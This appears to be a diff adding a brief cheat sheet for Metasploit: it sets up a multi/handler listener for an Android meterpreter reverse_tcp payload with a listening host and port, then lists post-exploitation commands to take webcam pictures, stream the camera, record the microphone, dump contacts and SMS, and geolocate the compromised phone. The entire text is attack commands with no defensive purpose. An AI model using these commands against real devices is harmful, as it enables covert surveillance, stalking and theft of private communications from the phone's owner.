@@ -1,0 +1,23 @@
+
+msfconsole (opens metasploit) 
+use multi/handler 
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST 192.168.0.2
+set LPORT 8080
+exploit
+
+
+
+
+
+
+webcam_snap (takes a picture using the device's camera!)
+---- OTHER COMMANDS ----
+- record_mic (record audio) 
+- webcam_snap (Take a Picture) 
+- webcam_stream (Stream Camera) 
+- dump_contacts (CALL LOGS!) 
+- dump_sms (SMS LOGS!)
+- geolocate (Track Device)
+---- OTHER COMMANDS ----
+
